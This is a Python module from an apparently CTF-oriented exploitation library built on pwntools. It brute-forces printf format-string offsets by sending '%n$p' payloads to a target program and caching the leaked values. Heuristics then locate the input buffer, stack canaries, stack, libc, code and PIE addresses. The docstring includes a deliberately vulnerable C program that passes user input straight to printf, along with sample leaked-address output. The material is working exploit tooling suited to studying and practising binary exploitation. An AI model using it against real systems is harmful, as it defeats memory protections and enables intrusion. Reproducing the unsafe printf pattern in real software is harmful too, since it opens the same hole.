'''Offset bruteforcers for format string bugs
----------------------------------------------
note: 'offset' refers to the `n` in
    %n$m
when dealing with printf exploitation.
----------------------------------------------
To use any of the functions here, you should
predefine a function that fsb.find_offset can
interact with. If a binary has code like:

    //usr/bin/gcc "$0" -o test.o; exit
    int main(){
        char s[200];
        fgets(s, 199, stdin);
        printf(s);
    }

fsb.find_offset needs a function that can
abstract away the i/o of the binary:

    @context.quiet
    def printf_io(send: str) -> bytes:
        r = remote(...)
        r.send(send)
        return r.recvline()

Then, we can use the io function to find, e.g.
the offset of the stack canary:

>>> context.binary = './test.o'
>>> fsb.find_offset.canary(printf_io)
[*] pwnscripts.fsb.find_offset for 'canary': 31
31

pwnscripts maintains a cache of printf values leaked, such that
subsequent runs will only run printf_io() if necessary:
>>> context.libc_database = '...'
>>> context.libc = '/lib/x86_64-linux-gnu/libc.so.6'
>>> context.log_level = 'debug'
>>> fsb.find_offset.libc(printf_io, offset=context.libc.symbols['__libc_start_main_ret']&0xfff)
[DEBUG] cache is at ~/.cache/.pwntools-cache-3.8/fsb-cache/07e93d243fc1a7d88432cfb25bdc8bbb7b65fcabd6bb96ccea9c1ad027f2039f-default
(cached) [DEBUG] pwnscripts: extracted 0x7c
(cached) [DEBUG] pwnscripts: extracted 0x4141414141414141
... (omitted) ...
(cached) [DEBUG] pwnscripts: extracted 0xcd088451e013aa00
[DEBUG] pwnscripts: extracted 0x0
[DEBUG] pwnscripts: extracted 0x7f1e3d92d0b3
[*] pwnscripts.fsb.find_offset for 'libc': 33
'''
from os import path, mkdir, unlink
from re import findall
from hashlib import sha256
from typing import Callable, Optional, Generator
from functools import wraps, partial
from pwnlib.log import getLogger
from pwnlib.util.cyclic import cyclic, cyclic_find
from pwnlib.util.packing import p32
from pwnscripts import config
from pwnscripts.context import context
from pwnscripts.util import is_addr, unpack_hex, offset_match
log = getLogger('pwnlib.exploit')
__all__ = ['flush_cache', 'buffer', 'canary', 'stack', 'libc', 'code', 'PIE']

def _get_cache_filename(cache: str, binary_cache={}) -> str:
    '''ONLY FOR INTERNAL USE
    return the filepath to the cache file for printf leaks (for the current context.binary).
    A specific `cache` label can be used to differentiate between e.g. remote/local printf offsets.

    Arguments:
        cache: the specific cache to query from. Defaults to 'default'.
        biinary_cache: DO NOT USE THIS ARGUMENT
    Returns:
        the full filepath to the aforementioned cache file, as a string.
    Raises RuntimeERror if `context.binary` is not set.
    '''
    cachedir = path.join(context.cache_dir, 'fsb-cache')
    if not path.exists(cachedir): mkdir(cachedir)

    if context.binary is None: raise RuntimeError(
        'pwnscripts.fsb.find_offset needs context.binary to be set for caching.'
        'if no binary is available, run fsb.find_offset.<func>(..., cache=None)'
    )
    if context.is_local is False: cache += '-remote'
    if context.binary.path not in binary_cache: # only do hashing once-per-run
        sha = sha256()
        sha.update(context.binary.get_data())
        binary_cache[context.binary.path] = sha.hexdigest()
    if context.libc is None: # libc is just unknown
        return path.join(cachedir, binary_cache[context.binary.path]+'-'+cache)
    return path.join(cachedir, binary_cache[context.binary.path]+'-'+context.libc.id+'-'+cache)

def flush_cache(cache: str='default') -> None:
    '''remove fsb.find_offset's cache for the current `context.binary`.
    Arguments:
        cache: the specific cache to clear; use the default one by default.
    Returns: None
    May return various errors if the cachefile happens to be non-writable.
    '''
    cache_filename = _get_cache_filename(cache)
    if path.exists(cache_filename): # just do nothing if this is not true.
        unlink(cache_filename)

def _getprintf(sendprintf: Callable[[bytes],bytes], cache: str) -> Generator:
    '''ONLY FOR INTERNAL USE
    Cached printf bruteforcing.
    Returns: generator that returns (offset, leaked_value) pairs.'''
    try: sendprintf('testing...\n')   # This is here to update context.is_local
    except Exception as e:  # We'll also do sendprintf() checking, as a bonus.
        log.error('fsb.find_offset: provided sendprintf() function raised %r' % e)
    if not path.exists(cache_filename := _get_cache_filename(cache)):
        with open(cache_filename, 'x') as f: pass   # make the file
    log.debug('cache is at %s' % cache_filename)
    # cache_filename *must* be a readable file, with all lines matching the regex /[0-9]+:[0-9]+/
    with open(cache_filename, 'r') as f:
        cache_dict = dict([map(int,l.split(':')) for l in f.read().strip().split('\n') if l])
    try:
        for i in range(config.PRINTF_MIN, config.PRINTF_MAX):
            try:
                if i in cache_dict: # NOTE: replace the proceeding line with something better
                    if context.log_level == 10: print('(cached) ', end='')
                else: # This is the part where an EOFError might occur.
                    payload = 'A'*8 + '%{}$p\n'.format(i) # an unaligned printf will fail here
                    extract = sendprintf(payload)
                    if b"(nil)" in extract: cache_dict[i] = 0
                    else: cache_dict[i] = unpack_hex(extract)    # Error will be -1
                if cache_dict[i] == -1:
                    log.info("pwnscripts: failed to extract printf data for offset %d." % i)
                    continue
                log.debug('pwnscripts: extracted ' + hex(cache_dict[i]))
                yield i,cache_dict[i]
            except EOFError: # catch a failed printf call if you can.
                log.warn("pwnscripts: fsb.find_offset caught EOFError for offset %d!" % i)
    finally: # update the cachefile. We're expecting the caller to .close() this generator.
        with open(cache_filename, 'w') as f:
            f.write('\n'.join('%d:%d'%t for t in cache_dict.items()))

def _sendprintf(requirement: Callable[[int,Optional[str]],bool]=None, has_regex: bool=False):
    '''ONLY FOR INTERNAL USE
    Generic printf bruteforcer for leaking values.
    '''
    if requirement is None: return partial(_sendprintf, has_regex=has_regex)    # ???
    @wraps(requirement)
    def inner(sendprintf: Callable[[bytes],bytes], offset: int=None, cache: str='default') -> int:
        if has_regex is False: _requirement = lambda v,_: requirement(v)
        else: _requirement = requirement
        # Actual code
        leak_generator = _getprintf(sendprintf, cache)
        for i,extract in leak_generator:
            if _requirement(extract, offset):
                log.info('%s for %r: %d' % (__name__, requirement.__name__, i))
                leak_generator.close() # Maybe we should have this run even on RuntimeError?
                return i
        raise RuntimeError
    return inner

#'''
@_sendprintf
def _buffer(resp) -> int:
    expected = (0x41414141 if context.arch == 'i386' else 0x4141414141414141)
    return expected == resp

def buffer(sendprintf: Callable[[bytes],bytes], maxlen=20) -> int:
    '''Bruteforcer to locate the offset of the input string itself.
    i.e. if buffer() returns 6,
        printf("%6$d") gives the value of p32("%6$p")

    Arguments:
        `sendprintf`: a function that simulates a single printf() call.
            This is much like the function passable to pwntools' FmtStr().
            e.g.
                def printf(l: bytes):
                    r = process('./mybinary')
                    r.send(l)
                    return r.recvline()
                buffer = fsb.find_offset.buffer(printf)
        `maxlen`: the maximum length of the input. If no value
            is given, the program assumes maxlen=20.

        Larger values of `maxlen` will allow for faster offset guessing.
    '''
    # Note: if config.PRINTF_MAX becomes really large, this might break
    guess_n = (maxlen-len("0x%10$x\n")) // context.bytes
    # So long as more than 1 guess can be done at a time:
    if guess_n > 1:
        '''Let's say guess_n=3 words worth of cyclic() can be inputted.
        If config.PRINTF_MIN=5, then the first payload ought to be
            cyclic(3*context.bytes) + "0x%{}$x\n".format(5+(3-1))
        because the first guess should be able to catch any offset in the range
            range(config.PRINTF_MIN, config.PRINTF_MIN+guess_n)
        '''
        for offset in range(config.PRINTF_MIN+guess_n-1, config.PRINTF_MAX+guess_n-1, guess_n):
            payload = cyclic(guess_n*context.bytes) + "0x%{}$x\n".format(offset).encode()
            extract = sendprintf(payload)
            if b"(nil)" in extract: extract = 0
            else: extract = unpack_hex(extract)    # Error will be -1
            if extract != -1 and 0 <= (found := cyclic_find(p32(extract))) < len(payload):
                assert found%context.bytes == 0 # if not, the offset is non-aligned
                log.info('%s for buffer: %d' % (__name__, offset-found//context.bytes))
                return offset-found//context.bytes
        raise RuntimeError  # Give up
    # else: use default bruteforcer
    return _buffer(sendprintf)
@_sendprintf
def canary(resp) -> int:
    '''heuristic-based bruteforcer to find the offset of a stack canary.

    In particular, a word matching
        word[-1]=='\\0' AND word.count('\\0')==1
        AND NOT looks_like_address()
    will be assumed a canary.
    '''
    return is_addr.canary(resp)

@_sendprintf
def stack(resp) -> int:
    '''heuristic-based bruteforcer to find a stack address

    Pattern matches for 0x7ff.{9} in amd64.
    '''
    if context.arch != 'amd64':
        raise NotImplementedError
    return findall('0x7ff.........', hex(resp)) != []

@_sendprintf(has_regex=True)
def libc(resp: int, offset: int=None) -> int:
    '''pattern-matcher for a libc address with an offset of `offset`
    This function is _not_ integrated with libc_db; it simply does a offset check
    for libc addresses, plus the `offset` given.
    An offset of `None` will simply pattern-match for any generic libc-ish address
    '''
    return is_addr.libc(resp) and offset_match(resp, offset)

@_sendprintf(has_regex=True)
def code(resp: int, offset: int=None) -> int:
    '''heuristic-based bruteforcer for non-PIE code addresses.
    Simply put, any value matching
        '0x804.{4}' (on i386)
        '0x40.{4}'  (on amd64)
    will be considered a code address.

    An `offset` can be provided to further narrow down the search to
    code addresses matching the offset given.'''
    return findall({'i386': '0x804....', 'amd64': '0x40....'}[context.arch], hex(resp)) != [] and\
           offset_match(resp, offset)

@_sendprintf(has_regex=True)
def PIE(resp: int, offset: int=None) -> int:
    '''heuristic-based bruteforcer for PIE code addresses.
    Simply put, any value matching
        '0x56.*' (on i386)
        '0x55.*'  (on amd64)
    will be considered a code address.

    An `offset` can be provided to further narrow down the search to
    code addresses matching the offset given.'''
    return is_addr.PIE(resp) and offset_match(resp, offset)
